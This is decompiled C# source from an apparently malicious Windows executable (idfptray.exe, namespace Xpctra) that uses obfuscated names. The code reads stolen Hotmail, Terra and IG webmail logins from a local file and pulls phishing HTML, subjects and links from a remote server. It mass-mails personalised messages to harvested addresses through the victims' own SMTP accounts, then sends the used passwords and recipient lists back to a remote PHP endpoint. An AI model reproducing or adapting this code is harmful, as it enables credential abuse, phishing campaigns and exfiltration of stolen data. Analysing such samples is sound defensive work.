// Decompiled with JetBrains decompiler
// Type: Xpctra.PORTA155LINGUAGEMFONTE
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace Xpctra
{
  internal class PORTA155LINGUAGEMFONTE
  {
    public static bool Enviando = false;
    private List<string> Emails = new List<string>();
    private List<string> ListaDeAssuntos = new List<string>();
    private List<string> ListaDeLinks = new List<string>();
    private List<PORTA155LINGUAGEMFONTE.ATIVA147MORMON> DadosConexao = new List<PORTA155LINGUAGEMFONTE.ATIVA147MORMON>();
    private string VULCANOLOGO123GAIATO = string.Empty;
    private string SmtpsEmails = "ss";
    private Random R = new Random();
    public object Semafaro = new object();
    public string html = (string) null;

    public void EnviaEmails()
    {
      PORTA155LINGUAGEMFONTE.Enviando = true;
      Thread.Sleep(this.R.Next(100, 3000));
      lock (this.Semafaro)
      {
        if (System.IO.File.Exists(Xpctra.Properties.Settings.Default.CaminhoPath + "E-Enviar.txt") && System.IO.File.Exists(Xpctra.Properties.Settings.Default.CaminhoPath + "E-Vit.txt"))
        {
          if (this.EFICACIA994DEFLACIONADO() && this.ARREGACAR854GALEGO() && this.RONCO338EXPORTADORA())
            this.EnviaSpam();
        }
      }
      PORTA155LINGUAGEMFONTE.Enviando = false;
    }

    private bool ARREGACAR854GALEGO()
    {
      string str = "lapis";
      try
      {
        if (System.IO.File.Exists(Xpctra.Properties.Settings.Default.CaminhoPath + "Enviado.txt"))
          str = new StreamReader(Xpctra.Properties.Settings.Default.CaminhoPath + "Enviado.txt").ReadToEnd();
        StreamReader streamReader = new StreamReader(Xpctra.Properties.Settings.Default.CaminhoPath + "E-Enviar.txt");
        string input;
        while ((input = streamReader.ReadLine()) != null)
        {
          Match match = Regex.Match(input, "([\\w-\\.]+)@((?:[\\w]+\\.)+)([a-zA-Z]{2,4})");
          if (match.Success && !this.Emails.Contains(match.Value) && (!match.Value.Contains("reply") && !str.Contains(match.Value)) && !this.SmtpsEmails.Contains(match.Value) && !this.VULCANOLOGO123GAIATO.Contains(match.Value))
            this.Emails.Add(match.Value);
        }
        streamReader.Dispose();
        streamReader.Close();
        if (this.Emails.Count > 0)
          return true;
      }
      catch (Exception ex)
      {
        return false;
      }
      return false;
    }

    private bool EFICACIA994DEFLACIONADO()
    {
      PORTA155LINGUAGEMFONTE.ATIVA147MORMON ativA147Mormon = new PORTA155LINGUAGEMFONTE.ATIVA147MORMON();
      try
      {
        StreamReader streamReader = new StreamReader(Xpctra.Properties.Settings.Default.CaminhoPath + "E-Vit.txt");
        string input;
        while ((input = streamReader.ReadLine()) != null)
        {
          if (input.Contains("Loguin: hotmail"))
          {
            input = input.Replace("Loguin: hotmail ", "");
            Match match = Regex.Match(input, "(?<Email>.*);(?<Senha>.*)");
            if (match.Success)
            {
              ativA147Mormon.email = match.Groups["Email"].Value;
              ativA147Mormon.senha = match.Groups["Senha"].Value;
              ativA147Mormon.porta = 587;
              ativA147Mormon.SmtpEndereço = "smtp.live.com";
              ativA147Mormon.Ssl = true;
              this.SmtpsEmails = ativA147Mormon.email + Environment.NewLine + this.SmtpsEmails;
              if (!this.DadosConexao.Contains(ativA147Mormon))
                this.DadosConexao.Add(ativA147Mormon);
            }
          }
          if (input.Contains("Loguin: Terra"))
          {
            input = input.Replace("Loguin: Terra ", "");
            Match match = Regex.Match(input, "(?<Email>.*);(?<Senha>.*)");
            if (match.Success)
            {
              ativA147Mormon.email = match.Groups["Email"].Value;
              ativA147Mormon.senha = match.Groups["Senha"].Value;
              ativA147Mormon.porta = 587;
              ativA147Mormon.SmtpEndereço = "smtp.terra.com.br";
              ativA147Mormon.Ssl = false;
              this.SmtpsEmails = ativA147Mormon.email + Environment.NewLine + this.SmtpsEmails;
              if (!this.DadosConexao.Contains(ativA147Mormon))
                this.DadosConexao.Add(ativA147Mormon);
            }
          }
          if (input.Contains("Loguin: Ig:"))
          {
            Match match = Regex.Match(input.Replace("Loguin: Ig: ", ""), "(?<Email>.*);(?<Senha>.*)");
            if (match.Success)
            {
              ativA147Mormon.email = match.Groups["Email"].Value;
              ativA147Mormon.senha = match.Groups["Senha"].Value;
              ativA147Mormon.porta = 587;
              ativA147Mormon.SmtpEndereço = "smtp.ig.com.br";
              ativA147Mormon.Ssl = false;
              this.SmtpsEmails = ativA147Mormon.email + Environment.NewLine + this.SmtpsEmails;
              if (!this.DadosConexao.Contains(ativA147Mormon))
                this.DadosConexao.Add(ativA147Mormon);
            }
          }
        }
        if (this.DadosConexao.Count > 0)
          return true;
      }
      catch (Exception ex)
      {
        return false;
      }
      return false;
    }

    private bool RONCO338EXPORTADORA()
    {
      bool flag1 = false;
      bool flag2 = false;
      bool flag3 = false;
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(VERMELHO265MONARCA.Config.Settings.LinkHtmlSpam);
        httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
        httpWebRequest.Proxy = (IWebProxy) null;
        httpWebRequest.Timeout = 30000;
        using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
        {
          using (Stream responseStream = response.GetResponseStream())
          {
            StreamReader streamReader = new StreamReader(responseStream, Encoding.GetEncoding("iso-8859-1"));
            string str;
            while ((str = streamReader.ReadLine()) != null)
            {
              if (str.Contains("FINAL HTML=================="))
                flag1 = false;
              if (flag1)
                this.html = str + Environment.NewLine + this.html;
              if (str.Contains("Comeco HTML=================="))
                flag1 = true;
              if (str.Contains("LINKS=================="))
                flag2 = false;
              if (flag2 && (!this.ListaDeAssuntos.Contains(str) && str != string.Empty))
                this.ListaDeAssuntos.Add(str);
              if (str.Contains("ASSUNTOS=================="))
                flag2 = true;
              if (flag3 && (!this.ListaDeLinks.Contains(str) && str != string.Empty))
                this.ListaDeLinks.Add(str);
              if (str.Contains("LINKS=================="))
                flag3 = true;
            }
            if (this.ListaDeLinks.Count > 0 && this.ListaDeAssuntos.Count > 0 && this.html != null)
              return true;
          }
        }
      }
      catch (Exception ex)
      {
        return false;
      }
      return false;
    }

    private void EnviaSpam()
    {
      lock (this.Semafaro)
      {
label_2:
        int index1 = this.R.Next(0, this.DadosConexao.Count);
        for (int index2 = 0; index2 < this.Emails.Count && this.DadosConexao.Count > 0; ++index2)
        {
          MailMessage message = new MailMessage();
          SmtpClient smtpClient1 = new SmtpClient();
          try
          {
            message.To.Add(this.Emails[index2]);
          }
          catch
          {
            continue;
          }
          try
          {
            MailAddress mailAddress = new MailAddress(this.DadosConexao[index1].email);
            message.From = mailAddress;
            message.Subject = this.ListaDeAssuntos[this.R.Next(0, this.ListaDeAssuntos.Count)];
            message.Body = this.ArrumaHtml(this.Emails[index2]);
            message.IsBodyHtml = true;
            message.Priority = MailPriority.High;
            message.DeliveryNotificationOptions = DeliveryNotificationOptions.OnSuccess;
            smtpClient1.Timeout = 9000;
            smtpClient1.Host = this.DadosConexao[index1].SmtpEndereço;
            SmtpClient smtpClient2 = smtpClient1;
            PORTA155LINGUAGEMFONTE.ATIVA147MORMON ativA147Mormon = this.DadosConexao[index1];
            int porta = ativA147Mormon.porta;
            smtpClient2.Port = porta;
            SmtpClient smtpClient3 = smtpClient1;
            ativA147Mormon = this.DadosConexao[index1];
            int num = ativA147Mormon.Ssl ? 1 : 0;
            smtpClient3.EnableSsl = num != 0;
            smtpClient1.DeliveryMethod = SmtpDeliveryMethod.Network;
            smtpClient1.UseDefaultCredentials = false;
            SmtpClient smtpClient4 = smtpClient1;
            ativA147Mormon = this.DadosConexao[index1];
            string email = ativA147Mormon.email;
            ativA147Mormon = this.DadosConexao[index1];
            string senha = ativA147Mormon.senha;
            NetworkCredential networkCredential = new NetworkCredential(email, senha);
            smtpClient4.Credentials = (ICredentialsByHost) networkCredential;
          }
          catch (Exception ex)
          {
          }
          try
          {
            smtpClient1.Send(message);
            string[] strArray = new string[6];
            strArray[0] = "smtp:";
            int index3 = 1;
            PORTA155LINGUAGEMFONTE.ATIVA147MORMON ativA147Mormon = this.DadosConexao[index1];
            string email = ativA147Mormon.email;
            strArray[index3] = email;
            strArray[2] = " Senha:";
            int index4 = 3;
            ativA147Mormon = this.DadosConexao[index1];
            string senha = ativA147Mormon.senha;
            strArray[index4] = senha;
            strArray[4] = " Para:";
            strArray[5] = this.Emails[index2];
            this.VULCANOLOGO123GAIATO = string.Concat(strArray) + Environment.NewLine + this.VULCANOLOGO123GAIATO;
            this.BLASFEMO468CURTO(this.Emails[index2]);
            this.Emails.Remove(this.Emails[index2]);
          }
          catch (SmtpException ex)
          {
            this.DadosConexao.Remove(this.DadosConexao[index1]);
            if (this.DadosConexao.Count > 0)
              goto label_2;
          }
          catch (Exception ex)
          {
          }
        }
        if (!(this.VULCANOLOGO123GAIATO != string.Empty))
          return;
        ClassMandaPraMim.MandaParasSite("Emails Enviados:" + this.VULCANOLOGO123GAIATO, VERMELHO265MONARCA.Config.Settings.PhpSeParador);
      }
    }

    private string ArrumaHtml(string emailatual)
    {
      string str1 = string.Empty;
      StringReader stringReader = new StringReader(this.html);
      string str2;
      while ((str2 = stringReader.ReadLine()) != null)
      {
        if (str2.Contains("$NOME"))
        {
          Match match = Regex.Match(emailatual, "(?<nome>.*)@");
          if (match.Success)
            str2 = str2.Replace("$NOME", match.Groups["nome"].Value);
        }
        if (str2.Contains("$Link"))
          str2 = str2.Replace("$Link", this.ListaDeLinks[this.R.Next(0, this.ListaDeLinks.Count)]);
        if (str2.Contains("$DATA"))
          str2 = str2.Replace("$DATA", DateTime.Now.ToString());
        str1 = str2 + Environment.NewLine + str1;
      }
      return str1;
    }

    private void BLASFEMO468CURTO(string Email)
    {
      StreamWriter streamWriter = System.IO.File.AppendText(Xpctra.Properties.Settings.Default.CaminhoPath + "Enviado.txt");
      streamWriter.WriteLine(Email);
      streamWriter.Dispose();
      streamWriter.Close();
    }

    private struct ATIVA147MORMON
    {
      public string email { get; set; }

      public string senha { get; set; }

      public int porta { get; set; }

      public string SmtpEndereço { get; set; }

      public bool Ssl { get; set; }
    }
  }
}
